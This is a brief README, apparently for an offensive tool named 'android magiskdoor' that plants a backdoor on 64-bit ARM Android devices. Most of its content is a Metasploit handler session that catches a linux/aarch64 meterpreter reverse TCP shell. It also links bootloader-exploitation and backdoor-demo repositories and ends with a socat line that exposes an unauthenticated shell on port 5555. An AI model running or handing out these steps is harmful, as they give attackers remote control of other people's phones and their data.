# android magiskdoor
currently only working attacking 64 bit arm devices from amd64 computers, porting should not be difficult though

# metasploit listening
`./msfconsole -q`  
`msf > use exploit/multi/handler`  
`msf exploit(handler) > set payload linux/aarch64/meterpreter_reverse_tcp`  
`payload => linux/aarch64/meterpreter_reverse_tcp`  
`msf exploit(handler) > set lhost 192.168.1.123`  
`lhost => 192.168.1.123`  
`msf exploit(handler) > set lport 4444`  
`lport => 4444`  
`msf exploit(handler) > run`  

# references
https://github.com/ernw/static-toolbox
https://github.com/bkerler/mtkclient
https://github.com/LuigiVampa92/unlocked-bootloader-backdoor-demo
socat -d -d TCP4-LISTEN:5555 EXEC:sh